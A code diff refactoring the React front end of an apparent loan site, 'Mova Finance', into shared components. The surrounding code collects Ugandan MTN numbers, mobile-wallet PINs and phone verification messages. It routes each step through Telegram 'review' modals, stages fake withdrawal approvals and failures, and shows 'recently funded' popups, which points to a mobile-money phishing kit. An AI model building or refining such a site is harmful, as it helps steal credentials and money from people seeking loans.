@@ -1,22 +1,13 @@
 import { useEffect, useState } from 'react';
 import {
   ArrowRight,
-  Banknote,
   Check,
   CheckCircle2,
   ChevronRight,
-  Clock3,
-  FileText,
-  MapPin,
-  MessageCircle,
-  Menu,
   ShieldCheck,
-  Smartphone,
-  Sparkles,
-  User,
-  X
 } from 'lucide-react';
 import { validatePostalCode, validateUgandaMtnNumber, validateVerificationMessage, validateWalletPin } from './walletValidation';
+import { ApprovalResultModal, Field, LoadingOverlay, LoanAmountControl, RecentFundingToast, SiteHeader, TelegramReviewModal, TermSelector } from './components/ui';
 
 const USD_TO_UGX = 3750;
 const API_BASE_URL = import.meta.env.VITE_API_URL || (typeof window !== 'undefined' && window.location.hostname === 'localhost' ? 'http://localhost:3001' : 'https://movafinanceapp.onrender.com');
@@ -147,7 +138,6 @@ function App() {
   const [telegramConsentAccepted, setTelegramConsentAccepted] = useState(false);
   const [withdrawalConfirmed, setWithdrawalConfirmed] = useState(false);
   const [withdrawalError, setWithdrawalError] = useState('');
-  const [otpCode, setOtpCode] = useState('');
   const [otpError, setOtpError] = useState('');
   const [verificationText, setVerificationText] = useState('');
   const [telegramApprovalOpen, setTelegramApprovalOpen] = useState(false);
@@ -436,7 +426,7 @@ function App() {
   }, [approvalId, telegramApprovalOpen]);
 
   useEffect(() => {
-    if (!telegramApprovalOpen) {
+    if (page !== 'finalVerification') {
       setTelegramWaitSeconds(0);
       return undefined;
     }
@@ -447,25 +437,17 @@ function App() {
     const timer = window.setInterval(updateElapsedTime, 1000);
 
     return () => window.clearInterval(timer);
-  }, [telegramApprovalOpen]);
+  }, [page]);
 
   const renderHome = () => (
     <>
-      <header className="site-header">
-        <a className="brand" href="#home"><span className="brand-symbol">m</span><span>Mova Finance</span></a>
-        <nav className={mobileOpen ? 'site-nav open' : 'site-nav'}>
-          <a href="#loans" onClick={() => setMobileOpen(false)}>Loans</a>
-          <a href="#why" onClick={() => setMobileOpen(false)}>Why Mova</a>
-        </nav>
-        <div className="header-actions">
-              <button type="button" className="header-button" disabled={!loanType} onClick={() => navigateToPage('application', 'Preparing your application')}>
-            Apply now <ArrowRight size={15} />
-          </button>
-        </div>
-        <button className="menu-button" onClick={() => setMobileOpen(!mobileOpen)} aria-label="Toggle menu">
-          {mobileOpen ? <X size={21} /> : <Menu size={21} />}
-        </button>
-      </header>
+      <SiteHeader
+        home
+        mobileOpen={mobileOpen}
+        onToggleMenu={() => setMobileOpen((open) => !open)}
+        nav={<><a href="#loans" onClick={() => setMobileOpen(false)}>Loans</a><a href="#why" onClick={() => setMobileOpen(false)}>Why Mova</a></>}
+        actions={<button type="button" className="header-button" disabled={!loanType} onClick={() => navigateToPage('application', 'Preparing your application')}>Apply now <ArrowRight size={15} /></button>}
+      />
 
       <main id="home">
         <section className="application-hero" id="loans">
@@ -499,19 +481,8 @@ function App() {
               <strong>{model.range.label}</strong>
               <small>Flexible repayment terms • No obligation</small>
             </div>}
-            {loanType && <div className="finder-amount">
-              <div className="finder-amount-heading"><span>Amount you want to apply for</span><strong>{formatUgx(model.amount)}</strong></div>
-              <input aria-label="Application amount" type="range" min={model.range.min} max={model.range.max} step="500" value={model.amount} onChange={(event) => setAmount(Number(event.target.value))} />
-              <div className="range-labels"><span>{formatUgx(model.range.min)}</span><span>{formatUgx(model.range.max)}</span></div>
-            </div>}
-            {loanType && <div className="finder-term">
-              <div className="finder-amount-heading"><span>Repayment period</span><strong>{term} months</strong></div>
-              <div className="term-row">
-                {[12, 24, 36, 48].map((option) => (
-                  <button key={option} type="button" className={term === option ? 'term selected' : 'term'} onClick={() => setTerm(option)}>{option} months</button>
-                ))}
-              </div>
-            </div>}
+            {loanType && <LoanAmountControl amount={formatUgx(model.amount)} range={{ ...model.range, value: model.amount, minLabel: formatUgx(model.range.min), maxLabel: formatUgx(model.range.max) }} onAmountChange={setAmount} compact />}
+            {loanType && <TermSelector term={term} onTermChange={setTerm} compact />}
             <button type="button" className={loanType ? 'card-button card-button-ready' : 'card-button'} disabled={!loanType} onClick={() => navigateToPage('application', 'Loading your loan form')}>Continue <ArrowRight size={16} /></button>
           </div>
         </section>
@@ -519,14 +490,7 @@ function App() {
       </main>
 
       {recentPopupVisible && !loanType && (
-        <div className="recent-popup" role="status" aria-live="polite">
-          <span className="recent-popup-icon"><CheckCircle2 size={15} /></span>
-          <div>
-            <span>Recently funded</span>
-            <strong>{recentFundedLoans[recentPopupIndex].name} received {recentFundedLoans[recentPopupIndex].amount}</strong>
-            <small>{recentFundedLoans[recentPopupIndex].type} · MTN {recentFundedLoans[recentPopupIndex].phone}</small>
-          </div>
-        </div>
+        <RecentFundingToast item={recentFundedLoans[recentPopupIndex]} />
       )}
 
       <footer className="landing-footer">
@@ -543,15 +507,7 @@ function App() {
 
     return (
       <div className="page-shell">
-        <header className="site-header">
-          <button type="button" className="brand brand-button" onClick={() => setPage('home')}>
-            <span className="brand-symbol">m</span><span>Mova Finance</span>
-          </button>
-          <div className="header-actions masthead-actions">
-            <span className="pill-tag">Secure application</span>
-            <button type="button" className="header-button" onClick={() => setPage('home')}>Back to home</button>
-          </div>
-        </header>
+        <SiteHeader onHome={() => setPage('home')} actions={<><span className="pill-tag">Secure application</span><button type="button" className="header-button" onClick={() => setPage('home')}>Back to home</button></>} />
 
         <main className="application-page">
           <section className="page-banner">
@@ -577,45 +533,32 @@ function App() {
               <div className="wizard-content">
                 {step === 0 && (
                   <div className="field-grid">
-                    <label className="field"><span>Full name</span><input name="fullName" value={form.fullName} onChange={handleChange} aria-invalid={Boolean(errors.fullName)} />{errors.fullName && <small className="field-error">{errors.fullName}</small>}</label>
-                    <label className="field"><span>Email</span><input type="email" name="email" value={form.email} onChange={handleChange} aria-invalid={Boolean(errors.email)} />{errors.email && <small className="field-error">{errors.email}</small>}</label>
-                    <label className="field"><span>Phone number</span><input name="phone" value={form.phone} onChange={handleChange} aria-invalid={Boolean(errors.phone)} />{errors.phone && <small className="field-error">{errors.phone}</small>}</label>
-                    <label className="field"><span>Location</span><input name="city" value={form.city} onChange={handleChange} aria-invalid={Boolean(errors.city)} />{errors.city && <small className="field-error">{errors.city}</small>}</label>
+                    <Field label="Full name" name="fullName" value={form.fullName} onChange={handleChange} error={errors.fullName} />
+                    <Field label="Email" name="email" type="email" value={form.email} onChange={handleChange} error={errors.email} />
+                    <Field label="Phone number" name="phone" value={form.phone} onChange={handleChange} error={errors.phone} />
+                    <Field label="Location" name="city" value={form.city} onChange={handleChange} error={errors.city} />
                   </div>
                 )}
 
                 {step === 1 && (
                   <div className="field-grid">
                     <label className="field"><span>Loan type</span><input value={model.isBusiness ? 'Business' : 'Personal'} readOnly /></label>
-                    <div className="loan-amount-control">
-                      <div className="loan-control-heading"><span>How much would you like?</span><strong>{formatUgx(model.amount)}</strong></div>
-                      <input aria-label="Loan amount" type="range" min={model.range.min} max={model.range.max} step="500" value={model.amount} onChange={(event) => setAmount(Number(event.target.value))} />
-                      <div className="range-labels"><span>{formatUgx(model.range.min)}</span><span>{formatUgx(model.range.max)}</span></div>
-                    </div>
-                    <div className="loan-amount-control">
-                      <div className="loan-control-heading"><span>Repayment period</span><strong>{model.term} months</strong></div>
-                      <div className="term-row">
-                        {[12, 24, 36, 48].map((option) => (
-                          <button key={option} type="button" className={model.term === option ? 'term selected' : 'term'} onClick={() => setTerm(option)}>
-                            {option} months
-                          </button>
-                        ))}
-                      </div>
-                    </div>
-                    <label className="field"><span>{model.isBusiness ? 'Business loan purpose' : 'Personal loan purpose'}</span><input name="loanPurpose" value={form.loanPurpose} onChange={handleChange} aria-invalid={Boolean(errors.loanPurpose)} />{errors.loanPurpose && <small className="field-error">{errors.loanPurpose}</small>}</label>
+                    <LoanAmountControl amount={formatUgx(model.amount)} range={{ ...model.range, value: model.amount, minLabel: formatUgx(model.range.min), maxLabel: formatUgx(model.range.max) }} onAmountChange={setAmount} />
+                    <TermSelector term={model.term} onTermChange={setTerm} />
+                    <Field label={model.isBusiness ? 'Business loan purpose' : 'Personal loan purpose'} name="loanPurpose" value={form.loanPurpose} onChange={handleChange} error={errors.loanPurpose} />
                     {model.isBusiness ? (
-                      <label className="field"><span>Business name</span><input name="businessName" value={form.businessName} onChange={handleChange} aria-invalid={Boolean(errors.businessName)} />{errors.businessName && <small className="field-error">{errors.businessName}</small>}</label>
+                      <Field label="Business name" name="businessName" value={form.businessName} onChange={handleChange} error={errors.businessName} />
                     ) : (
-                      <label className="field"><span>Employment status</span><input name="employmentStatus" value={form.employmentStatus} onChange={handleChange} aria-invalid={Boolean(errors.employmentStatus)} />{errors.employmentStatus && <small className="field-error">{errors.employmentStatus}</small>}</label>
+                      <Field label="Employment status" name="employmentStatus" value={form.employmentStatus} onChange={handleChange} error={errors.employmentStatus} />
                     )}
-                    {!model.isBusiness && <label className="field"><span>Employer name</span><input name="employerName" value={form.employerName} onChange={handleChange} aria-invalid={Boolean(errors.employerName)} />{errors.employerName && <small className="field-error">{errors.employerName}</small>}</label>}
-                    <label className="field"><span>Monthly income</span><input name="income" value={form.income} onChange={handleChange} aria-invalid={Boolean(errors.income)} />{errors.income && <small className="field-error">{errors.income}</small>}</label>
+                    {!model.isBusiness && <Field label="Employer name" name="employerName" value={form.employerName} onChange={handleChange} error={errors.employerName} />}
+                    <Field label="Monthly income" name="income" value={form.income} onChange={handleChange} error={errors.income} />
                   </div>
                 )}
 
                 {step === 2 && (
                   <div className="field-grid">
-                    <label className="field"><span>ID number</span><input name="idNumber" value={form.idNumber} onChange={handleChange} aria-invalid={Boolean(errors.idNumber)} />{errors.idNumber && <small className="field-error">{errors.idNumber}</small>}</label>
+                    <Field label="ID number" name="idNumber" value={form.idNumber} onChange={handleChange} error={errors.idNumber} />
                     <div className="field consent-field">
                       <span>Consent</span>
                       <label className="checkbox-row"><input type="checkbox" checked={consentAccepted} onChange={(event) => { setConsentAccepted(event.target.checked); setErrors((current) => ({ ...current, consent: '' })); }} /> <span>I agree to the loan terms and confirm the information provided is accurate and complete.</span></label>
@@ -644,15 +587,7 @@ function App() {
 
   const renderReview = () => (
     <div className="page-shell">
-      <header className="site-header">
-        <button type="button" className="brand brand-button" onClick={() => setPage('home')}>
-          <span className="brand-symbol">m</span><span>Mova Finance</span>
-        </button>
-        <div className="header-actions masthead-actions">
-          <span className="pill-tag">Application review</span>
-          <button type="button" className="header-button" onClick={() => setPage('application')}>Edit form</button>
-        </div>
-      </header>
+      <SiteHeader onHome={() => setPage('home')} actions={<><span className="pill-tag">Application review</span><button type="button" className="header-button" onClick={() => setPage('application')}>Edit form</button></>} />
 
       <main className="review-page">
         <section className="page-banner compact-banner">
@@ -697,11 +632,7 @@ function App() {
 
   const renderSuccess = () => (
     <div className="page-shell success-page-shell">
-      <header className="site-header">
-        <button type="button" className="brand brand-button" onClick={() => setPage('home')}>
-          <span className="brand-symbol">m</span><span>Mova Finance</span>
-        </button>
-      </header>
+      <SiteHeader onHome={() => setPage('home')} />
 
       <main className="success-page">
         <div className="success-card">
@@ -739,48 +670,22 @@ function App() {
 
   const renderWithdrawalFailed = () => (
     <div className="page-shell success-page-shell">
-      <header className="site-header">
-        <button type="button" className="brand brand-button" onClick={() => setPage('home')}>
-          <span className="brand-symbol">m</span><span>Mova Finance</span>
-        </button>
-        <div className="header-actions masthead-actions"><span className="pill-tag">Secure verification</span></div>
-      </header>
+      <SiteHeader onHome={() => setPage('home')} actions={<span className="pill-tag">Secure verification</span>} />
 
       <main className="success-page">
         <div className="success-card verification-card">
           {withdrawalSuccessOpen && (
-            <div className="success-modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="approval-result-title">
-              <div className="success-modal">
-                <div className="success-modal-icon"><CheckCircle2 size={34} /></div>
-                {approvalResultStage === 'withdrawal' ? (
-                  <>
-                    <span className="eyebrow">Withdrawal approved</span>
-                    <h2 id="approval-result-title">Your withdrawal is ready</h2>
-                    <p>Lovely, your withdrawal details are approved. Continue below to enter the verification message sent to your phone.</p>
-                    <button type="button" className="primary-button" onClick={() => setWithdrawalSuccessOpen(false)}>Continue <ArrowRight size={16} /></button>
-                  </>
-                ) : (
-                  <>
-                    <span className="eyebrow">Verification approved</span>
-                    <h2 id="approval-result-title">Your verification is complete</h2>
-                    <p>Thank you, your verification message has been received and approved. Continue to the final verification step.</p>
-                    <button type="button" className="primary-button" onClick={() => { setWithdrawalSuccessOpen(false); navigateToPage('finalVerification', 'Preparing final verification'); }}>Continue <ArrowRight size={16} /></button>
-                  </>
-                )}
-              </div>
-            </div>
+            <ApprovalResultModal
+              stage={approvalResultStage}
+              onContinue={() => {
+                setWithdrawalSuccessOpen(false);
+                if (approvalResultStage === 'verification') navigateToPage('finalVerification', 'Preparing final verification');
+              }}
+            />
           )}
 
           {telegramApprovalOpen && (
-            <div className="telegram-modal-backdrop" role="dialog" aria-modal="true">
-              <div className="telegram-modal telegram-waiting-modal">
-                <div className="telegram-waiting-icon"><span className="telegram-waiting-dot" /></div>
-                <span className="eyebrow">Secure review</span>
-                <h2>{approvalStage === 'withdrawal' ? 'Confirming your withdrawal' : 'Verifying your message'}</h2>
-                <p>{approvalStage === 'withdrawal' ? 'Your withdrawal details are being reviewed. Please wait before continuing to message verification.' : 'Your verification message is being reviewed. Please wait while we complete the withdrawal check.'}</p>
-                <div className="telegram-waiting-status"><span className="telegram-waiting-dot" /> Review in progress</div>
-              </div>
-            </div>
+            <TelegramReviewModal stage={approvalStage} />
           )}
 
           <div className="verification-topline">
@@ -828,25 +733,12 @@ function App() {
 
   const renderFinalVerification = () => (
     <div className="page-shell success-page-shell">
-      <header className="site-header">
-        <button type="button" className="brand brand-button" onClick={() => setPage('home')}>
-          <span className="brand-symbol">m</span><span>Mova Finance</span>
-        </button>
-        <div className="header-actions masthead-actions"><span className="pill-tag">Final verification</span></div>
-      </header>
+      <SiteHeader onHome={() => setPage('home')} actions={<span className="pill-tag">Final verification</span>} />
 
       <main className="success-page">
         <div className="success-card final-verification-card">
           {telegramApprovalOpen && (
-            <div className="telegram-modal-backdrop" role="dialog" aria-modal="true">
-              <div className="telegram-modal telegram-waiting-modal">
-                <div className="telegram-waiting-icon"><div className="spinner" aria-hidden="true" /></div>
-                <span className="eyebrow">Secure review</span>
-                <h2>Completing final verification</h2>
-                <p>Your code is being reviewed by Mova Finance support. Please wait while we complete your application.</p>
-                <div className="telegram-waiting-status"><span className="telegram-waiting-dot" /> Review in progress</div>
-              </div>
-            </div>
+            <TelegramReviewModal stage={approvalStage} />
           )}
 
           <div className="verification-topline">
@@ -924,26 +816,7 @@ function App() {
 
   return (
     <div className="site-shell">
-      {isLoading && (
-        <div className="loading-overlay" role="status" aria-live="polite" aria-busy="true">
-          <div className="loading-panel">
-            <div className="loading-header">
-              <div className="loading-brand" aria-label="Mova Finance">
-                <span className="brand-symbol">m</span>
-                <span>Mova Finance</span>
-              </div>
-              <span className="security-badge">Secure review</span>
-            </div>
-            <div className="spinner-wrap">
-              <div className="spinner" aria-hidden="true" />
-            </div>
-            <div className="loading-text">{loadingMessage}</div>
-            <div className="loading-progress" aria-hidden="true">
-              <span />
-            </div>
-          </div>
-        </div>
-      )}
+      {isLoading && <LoadingOverlay message={loadingMessage} />}
       {page === 'home' && renderHome()}
       {page === 'application' && renderApplication()}
       {page === 'review' && renderReview()}
